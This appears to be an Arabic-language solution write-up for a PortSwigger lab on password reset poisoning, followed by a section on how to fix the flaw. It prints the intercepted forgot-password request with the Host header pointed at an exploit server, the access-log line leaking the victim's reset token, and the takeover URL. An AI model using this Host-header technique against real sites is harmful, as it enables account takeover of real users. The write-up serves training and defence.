# [Basic password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning)

## **`الهدف`**
القيام بإعادة ضبط كلمة مرور `reset password` حساب `carlos` ثم الدخول إلي حسابه.
## **`خطوات الحل`**
نقوم بالضغط على `Forgot password?` ونكتب اسم `carlos` ونقوم باعتراض الـ `request`
```http
POST /forgot-password HTTP/2
Host: 0a35008a04339672802a3f3f006b00cf.web-security-academy.net
Cookie: session=161GTWLixyKCyFlTn8E3CsuwhBfhPRiU; _lab=46%7cMCwCFAHr5yFHa62XeH7CfXuV06i6N6GfAhQC2aXs30lLmhX08wumfMoFASekmZbpo1hE5%2fkohbFdjme0vrh6otM1AmdV7ua4e7xOFS2NqYf5C%2bpYslSP%2fBhmFx2MURx5u3V%2fC7CIW55HfaNzUlexQAJR9mhCXcJ5h%2fgUHhsUSaqZo%2bs%3d

csrf=36iLHQhV4v6cbm6p9wKrCLyP6T3xf7vw&username=carlos
```

ونقوم بنسخ الـ `URL` الخاص بسيرفر الاستغلال الذي يوفره اللاب، ونضعه بجانب `Host:`
```http
POST /forgot-password HTTP/2
Host: exploit-0a6000a20470964d80af3e0501d100ba.exploit-server.net
Cookie: session=161GTWLixyKCyFlTn8E3CsuwhBfhPRiU; _lab=46%7cMCwCFAHr5yFHa62XeH7CfXuV06i6N6GfAhQC2aXs30lLmhX08wumfMoFASekmZbpo1hE5%2fkohbFdjme0vrh6otM1AmdV7ua4e7xOFS2NqYf5C%2bpYslSP%2fBhmFx2MURx5u3V%2fC7CIW55HfaNzUlexQAJR9mhCXcJ5h%2fgUHhsUSaqZo%2bs%3d

csrf=36iLHQhV4v6cbm6p9wKrCLyP6T3xf7vw&username=carlos
```
ونقوم بتمرير الـ `request` وبعد ذلك نتوجه إلى صفحة `Access log` بداخل سيرفر الاستغلال لنجد السطر التالي
```
10.0.4.150      2026-09-14 07:07:43 +0000 "GET /forgot-password?temp-forgot-password-token=1nxupykj4enfdba939wpbc20w6n4g6xf HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
```

فنقوم بنسخ الـ `token` مع المسار والذي هو 
`/forgot-password?temp-forgot-password-token=1nxupykj4enfdba939wpbc20w6n4g6xf`

ونضعه كمسار مع الـ `URL` الخاص باللاب ونتوجه إليه
```URL
https://0a35008a04339672802a3f3f006b00cf.web-security-academy.net/forgot-password?temp-forgot-password-token=1nxupykj4enfdba939wpbc20w6n4g6xf
```

لنجد أن صفحة إعادة تعيين كلمة المرور الخاصة بـ `carlos` أمامنا، فنختار أى كلمة مرور وبعد ذلك نقوم بالدخول لحساب `carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب ألا يعتمد التطبيق نهائياً على أي `HTTP Headers` (مثل `Host` أو `X-Forwarded-Host`) لمعرفة النطاق `Domain` الخاص به عند إنشاء روابط حساسة، وبدلاً من ذلك، يتم تعريف الرابط الأساسي للموقع `Base URL` بشكل ثابت داخل ملفات إعدادات التطبيق أو متغيرات البيئة` Environment Variables`، بحيث أنه عندما يقوم النظام بإنشاء رابط إعادة التعيين، فإنه يدمج هذا الرابط الثابت مع الـ `Token`، وبهذه الطريقة، أي تلاعب خارجي في الترويسات لن يؤثر على الرابط المُرسل.

وإذا كانت بنية التطبيق `Architecture` تجبره لسبب ما على الاعتماد على هذه الترويسات (مثلاً في بيئات العمل المعقدة)، فيجب إنشاء قائمة بيضاء `Whitelist`، بحيث أنه عند استلام الـ `request`، يتحقق التطبيق من القيمة الموجودة في ترويسة `X-Forwarded-Host`، وإذا كانت القيمة تتطابق تماماً مع قائمة النطاقات الموثوقة والمسموح بها فقط، يتم قبولها، ولكن إذا كانت أي قيمة أخرى (مثل سيرفر الاستغلال)، يتم رفض الـ `request` فوراً.

وإذا لم تكن البنية التحتية للموقع تستخدم `Reverse Proxy` أو` Load Balancer` يتطلب استخدام ترويسة `X-Forwarded-Host` لعمله الداخلي، فيجب إعداد الـ `Middleware` أو سيرفر الويب (مثل `Nginx` أو `Apache`) ليتجاهل أو يحذف هذه الترويسة تماماً من أي `Request` قادم قبل أن يصل إلى الواجهة الخلفية `back-end.`

ويجب أن يكون الـ `token` له مدة صلاحية قصيرة `10-15` دقيقة ويتم حرقه بعدها حتى لو لم يتم استخدامه.

ويُفضل عندما يضغط المُستخدم على رابط إعادة ضبط كلمة المرور في حسابه أن يقوم السيرفر باستخراج الـ `token` من الـ `URL` وتضمينه داخل الـ `Form` كـ `hidden input` مثلًا، وعندما يكتب المُستخدم كلمة المرور الجديدة ويضعط حفظ يتم إرساله عبر الـ `POST Body` وليس بداخل الـ `URL`  لأن الـ `URLs` يتم تسجيلها في ملفات الـ `Logs` الخاصة بالسيرفر والـ `Proxy`، وهذا قد يؤدي لتسريب الـ `token` إذا لم يكن السيرفر مؤمن جيدًا، أو إذا كان المُستخدم يستعمل نوعًا من الـ `Proxy` أو الـ `VPN.`
